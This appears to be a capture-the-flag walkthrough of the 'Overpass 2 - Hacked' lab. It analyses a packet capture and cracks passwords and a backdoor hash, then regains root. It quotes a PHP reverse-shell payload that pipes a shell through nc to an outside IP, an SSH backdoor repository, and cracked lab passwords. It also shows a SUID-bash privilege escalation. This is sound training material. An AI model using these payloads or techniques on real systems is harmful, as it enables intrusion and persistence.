# Overpass 2 Hacked (ssh backdoor)

### **Overpass 2 - Hacked** <a href="#nnivv6u45yrp" id="nnivv6u45yrp"></a>

* SOC team noticed suspicious activity on late night shift.
* Packets captured as attack happened.

### **Forensics - Analyse the PCAP** <a href="#fvawteqhq1z1" id="fvawteqhq1z1"></a>

1. What was the URL of the page they used to upload a reverse shell?
   * Follow TCP Stream (tcp.stream eq 1).

POST /development/upload.php HTTP/1.1

1. What payload did the attacker use to gain access?
   * Follow TCP Stream (tcp.stream eq 1).

\<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

1. What password did the attacker use to privesc?
   * Follow TCP Stream (tcp.stream eq 3).

\[sudo] password for james: whenevernoteartinstant

1. How did the attacker establish persistence?
   * Follow TCP Stream (tcp.stream eq 3).

git clone https://github.com/NinjaJc01/ssh-backdoor

1. Using the fasttrack wordlist, how many of the system passwords were crackable?
   1. Copy and paste exposed shadow file from PCAP tcp.stream eq3 into "shadow" file.
   2. Run JtR against shadowfile.

john --wordlist=/usr/share/wordlists/fasttrack.txt shadow

\[...snip...]

secret12 (bee)

abcd123 (szymex)

1qaz2wsx (muirland)

secuirty3 (paradox)

\[...snip...]

### **Research - Analyse the code** <a href="#a9w1g078cpdj" id="a9w1g078cpdj"></a>

1. What's the default hash for the backdoor?
   * Hash displayed in[ ssh-backdoor GitHub repository](https://github.com/NinjaJc01/ssh-backdoor) "hash" variable of "main.go" code.
2. What's the hardcoded salt for the backdoor?
   * Salt displayed in[ ssh-backdoor GitHub repository](https://github.com/NinjaJc01/ssh-backdoor) "passwordHandler" function of "main.go" code.
3. What was the hash that the attacker used? - go back to the PCAP for this!
   * Follow TCP Stream (tcp.stream eq 3).

james@overpass-production:\~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

1. Crack the hash using rockyou and a cracking tool of your choice. What's the password?

* Copy and paste hash into "hash" file.
  * Suffix hash with : then the salt.
* Hashing algorith displayed in[ ssh-backdoor GitHub respository](https://github.com/NinjaJc01/ssh-backdoor) "hashPassword" function of "main.go" code.

func hashPassword(password string, salt string) string {

hash := sha512.Sum512(\[]byte(password + salt))

return fmt.Sprintf("%x", hash)

}

* Search for SHA512 password+hash format on[ hashcat wiki](https://hashcat.net/wiki/doku.php?id=example\_hashes).

1710 sha512($pass.$salt)

* Run hashcat against hash file.
  * \-m specifies the hash type.
  * \-a specifies the attack type.
    * 0 is straight attack type.

hashcat -m 1710 -a 0 hash /usr/share/wordlists/rockyou.txt

\[...snip...]

Dictionary cache built:

\* Filename..: /usr/share/wordlists/rockyou.txt

\* Passwords.: 14344392

\* Bytes.....: 139921507

\* Keyspace..: 14344385

\* Runtime...: 0 secs

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 1710 (sha512($pass.$salt))

Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05

Time.Started.....: Tue Mar 5 16:48:43 2024 (1 sec)

Time.Estimated...: Tue Mar 5 16:48:44 2024 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........: 228.0 kH/s (0.06ms) @ Accel:59 Loops:1 Thr:1 Vec:2

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 17228/14344385 (0.12%)

Rejected.........: 0/17228 (0.00%)

Restore.Point....: 16992/14344385 (0.12%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: yomisma -> october19

Hardware.Mon.#1..: Util: 21%

Started: Tue Mar 5 16:48:25 2024

Stopped: Tue Mar 5 16:48:45 2024

### **Attack - Get back in!** <a href="#cawfsdeykvvs" id="cawfsdeykvvs"></a>

* Paradox needs someone to take control of the Overpass production server again.
* There's flags on the box that Overpass can't afford to lose by formatting the server!

#### **Perform Nmap scan (Reconnaissance: Active Scanning: Vulnerability Scanning (T1595.002))** <a href="#t7mvf3g95b01" id="t7mvf3g95b01"></a>

nmap -Pn -sC -p- -sV -oN TARGET\_IP\_scan.nmap TARGET\_IP

map scan report for 10.10.75.252

Host is up (0.026s latency).

Not shown: 65532 closed tcp ports (conn-refused)

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\| 2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)

\| 256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)

|\_ 256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)

80/tcp open http Apache httpd 2.4.29 ((Ubuntu))

|\_http-server-header: Apache/2.4.29 (Ubuntu)

|\_http-title: LOL Hacked

2222/tcp open ssh OpenSSH 8.2p1 Debian 4 (protocol 2.0)

\| ssh-hostkey:

|\_ 2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

#### **Detect hidden directories using GoBuster (Reconnaissance: Wordlist Scanning (T1595.003))** <a href="#bbxjcbqkjg6" id="bbxjcbqkjg6"></a>

gobuster dir --url http://TARGET\_IP/ -w /usr/share/wordlists/dirb/common.txt > gobuster.txt

/.hta (Status: 403) \[Size: 277]

/.htpasswd (Status: 403) \[Size: 277]

/aboutus (Status: 301) \[Size: 314] \[--> http://10.10.75.252/aboutus/]

/.htaccess (Status: 403) \[Size: 277]

/css (Status: 301) \[Size: 310] \[--> http://10.10.75.252/css/]

/downloads (Status: 301) \[Size: 316] \[--> http://10.10.75.252/downloads/]

/img (Status: 301) \[Size: 310] \[--> http://10.10.75.252/img/]

/index.html (Status: 200) \[Size: 815]

/server-status (Status: 403) \[Size: 277]

* /development directory originally exploited by attacker is not listed.

#### **Browse to webserver on port 80 (Reconnaissance: Search Victim-Owned Websites (ID: T1594))** <a href="#id-381t88tjn73o" id="id-381t88tjn73o"></a>

1. The attacker defaced the website. What message did they leave as a heading - "H4ck3d by CooctusClan"

#### **Attempt to SSH to target host using credentials exposed via shadowfile (Initial Access: Valid Accounts: Local Accounts (ID: T1078.003))** <a href="#fmkc1i673zx" id="fmkc1i673zx"></a>

â”€$ ssh bee@10.10.75.252

The authenticity of host '10.10.75.252 (10.10.75.252)' can't be established.

ED25519 key fingerprint is SHA256:M+alDmfQ9SPk8CLKIRe6QQD9sNcr/ptoDNbQLZDzIqs.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added '10.10.75.252' (ED25519) to the list of known hosts.

bee@10.10.75.252's password:

Permission denied, please try again.

ssh szymex@10.10.75.252

szymex@10.10.75.252's password:

Permission denied, please try again.

ssh muirland@10.10.75.252

muirland@10.10.75.252's password:

Permission denied, please try again.

ssh paradox@10.10.75.252

paradox@10.10.75.252's password:

Permission denied, please try again.

#### **Attempt to ssh into target host on TCP/2222 (Initial Access: Valid Accounts: Local Accounts (ID: T1078.003))** <a href="#rm2xo46354cv" id="rm2xo46354cv"></a>

* Wireshark tcp.stream eq 3 filter shows ssh-backdoor configured to listen on TCP/2222

james@overpass-production:\~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

* Nmap scan shows target host listening on TCP/2222

ssh TARGET\_IP -p 2222

Unable to negotiate with 10.10.248.130 port 2222: no matching host key type found. Their offer: ssh-rsa

**Question Hint** Note: If you get an error saying "Unable to negotiate with port 22: no matching how to key type", this is because OpenSSH have deprecated ssh-rsa. Add "-oHostKeyAlgorithms=+ssh-rsa" to your command to connect.

ssh TARGET\_IP -p 2222 -o HostKeyAlgorithms=+ssh-rsa

The authenticity of host '\[10.10.248.130]:2222 (\[10.10.248.130]:2222)' can't be established.

RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added '\[10.10.248.130]:2222' (RSA) to the list of known hosts.

kali@10.10.248.130's password:

To run a command as administrator (user "root"), use "sudo \<command>".

See "man sudo\_root" for details.

whoami

james

id

uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

**What's the user flag?**

find / -name user.txt -type f 2>/dev/null

/home/james/user.txt

#### **Check current user's sudo delegation ()** <a href="#rip0wu2jxde4" id="rip0wu2jxde4"></a>

sudo -l

\[sudo] password for james:

Sorry, try again.

* "whenevernoteartinstant" password does not work.

#### **Check SUID bit set on files ()** <a href="#w412gsk4nx1z" id="w412gsk4nx1z"></a>

find / -perm -u=s -type f 2>/dev/null\`

/usr/bin/chsh

/usr/bin/sudo

/usr/bin/chfn

/usr/bin/pkexec

/usr/bin/traceroute6.iputils

/usr/bin/newuidmap

/usr/bin/newgidmap

/usr/bin/passwd

/usr/bin/gpasswd

/usr/bin/at

/usr/bin/newgrp

/usr/lib/openssh/ssh-keysign

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic

/usr/lib/eject/dmcrypt-get-device

/bin/mount

/bin/fusermount

/bin/su

/bin/ping

/bin/umount

/home/james/.suid\_bash

* "/home/james/.suid\_bash" looks of interest.

ls -la /home/james/

\[...snip...]

\-rwsr-sr-x 1 root root 1113504 Jul 22 2020 .suid\_bash

\[...snip...]

#### **Check GTFOBins for SUID exploits of bash (Resource Development: Develop Capabilities: Exploits (ID: T1587.004))** <a href="#id-77t41rihlnix" id="id-77t41rihlnix"></a>

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges. This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path. sudo install -m =xs $(which bash) . ./bash -p

#### **Escalate privileges using exploit (Privilege Escalation: Abuse Elevation Control Mechanism: Setuid and Setgid (T1548.001))** <a href="#id-9g8ilwgwisd4" id="id-9g8ilwgwisd4"></a>

cd /home/james

/.suid\_bash -p

\=whoami

root

id

uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)

**What's the root flag?**

cd /

find / -name root.txt -type f 2>/dev/null

/root/root.txt
